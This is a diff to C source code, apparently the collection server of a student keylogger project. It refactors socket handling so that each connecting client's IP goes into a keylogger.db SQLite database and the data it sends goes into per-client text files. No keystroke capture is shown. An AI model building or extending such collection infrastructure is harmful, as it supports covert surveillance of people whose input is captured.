@@ -5,8 +5,7 @@
 #include "../database/interface/mainWindow.h"
 #include "../database/database.h"
 
-int			init_socket(nfds_t *reuse)
-{
+int			init_socket(nfds_t *reuse) {
   struct addrinfo	hints, *resinfo = NULL;
   int			sock = -1;
 
@@ -27,7 +26,14 @@ int			init_socket(nfds_t *reuse)
   return (sock);
 }
 
-void server(struct sockaddr_in *addr, sqlite3 *db) {
+struct data {
+  sqlite3 *keylogger;
+  int num_client;
+  char *link;
+
+};
+
+void server(struct sockaddr_in *addr, struct data *d) {
   socklen_t socklen= sizeof(struct sockaddr_in);
   int		sock_fd;
   int		io= 1;
@@ -35,7 +41,7 @@ void server(struct sockaddr_in *addr, sqlite3 *db) {
   nfds_t	reuse = 1;
   char		buffer[BUFFSIZE];
   struct pollfd fds[200];
-  int num_client= 0;
+  d->num_client= 0;
   //conserver l'adresse du client dans le while
   char addr_store[20];
   //stocker les donnees du client sous forme de fichier
@@ -68,8 +74,6 @@ void server(struct sockaddr_in *addr, sqlite3 *db) {
       perror("Poll error");
 
     for(nfds_t i = 0; i < reuse; i++) {
-      //printf("__boucle for reuse %zu\n", reuse);
-      //printf("__boucle for i %zu\n\n", i);
       if(fds[i].revents & POLLNVAL)
 	continue;
       
@@ -90,8 +94,8 @@ void server(struct sockaddr_in *addr, sqlite3 *db) {
       }
 
       if (fds[i].fd == fds[0].fd) {
-	num_client++;
-	printf("num client %d\n", num_client);
+	d->num_client++;
+	printf("num client %d\n", d->num_client);
       	do {
           new_fd = accept(fds[0].fd, (struct sockaddr*)&addr[i], &socklen);
 	  //printf("client addr: %s\n", inet_ntoa(addr[i].sin_addr));
@@ -99,11 +103,11 @@ void server(struct sockaddr_in *addr, sqlite3 *db) {
              break;
 
 	  char name_client[20]= "client ";
-	  strcat(name_client, itoa(num_client));
+	  strcat(name_client, itoa(d->num_client));
 	  
 	  //creation du client au moment de la connexion au serveur
-	  if(research_clients(db, num_client) == 1)
-	    create_clients(db, inet_ntoa(addr[i].sin_addr), name_client);
+	  if(research_clients(d->keylogger, d->num_client) == 1)
+	    create_clients(d->keylogger, inet_ntoa(addr[i].sin_addr), name_client);
 
 	  fds[reuse].fd = new_fd;
           fds[reuse].events = POLLIN;
@@ -120,12 +124,14 @@ void server(struct sockaddr_in *addr, sqlite3 *db) {
 	  //creation du fichier pour stocker les donnees du client
 	  memset(tmp, 0, 60);
 	  strcat(tmp, link);
-	  strcat(tmp, itoa(num_client));
+	  strcat(tmp, itoa(d->num_client));
 	  strcat(tmp, ".txt");
 
-	  if(research_data(db, num_client) == 0)
-	    create_data(db, 1, num_client, tmp);
+	  //creation de la donnee du client 
+	  if(research_data(d->keylogger, d->num_client) == 0)
+	    create_data(d->keylogger, 1, d->num_client, tmp);
 
+	  printf("tmp before fopen: %s\n", tmp);
 	  file= fopen(tmp, "a");
 	  if(file == NULL)
 	    err(1, "Pb with fopen dataSent_byClient");
@@ -135,6 +141,7 @@ void server(struct sockaddr_in *addr, sqlite3 *db) {
 
 	  if(fclose(file) != 0)
 	    err(1, "Pb with close");
+	  d->link= tmp;
 
 	  fcntl(fds[i].fd, F_SETFL, O_NONBLOCK);
 	  
@@ -161,7 +168,7 @@ void sigint_handler(int sig) {
 }
 
 int main () { 
-  sqlite3 *keylogger;
+  struct data *d= calloc(1, sizeof(struct data));
   pthread_t thread_window;
   
   if(pthread_create(&thread_window, NULL, mainWindow, NULL) == -1) {
@@ -169,7 +176,7 @@ int main () {
     return EXIT_FAILURE;
   }
 
-  int res= sqlite3_open("../database/keylogger.db", &keylogger);
+  int res= sqlite3_open("../database/keylogger.db", &d->keylogger);
   if(res) {
     perror("can't succeed\n");
     exit(0);
@@ -179,9 +186,9 @@ int main () {
   
   struct sockaddr_in *addr= calloc(100, sizeof(struct sockaddr_in));
   signal(SIGINT, sigint_handler);
-  server(addr, keylogger);
+  server(addr, d);
   free(addr);
-  sqlite3_close(keylogger);
+  sqlite3_close(d->keylogger);
 
   if(pthread_join(thread_window, NULL)) {
     perror("pthread_join error\n");
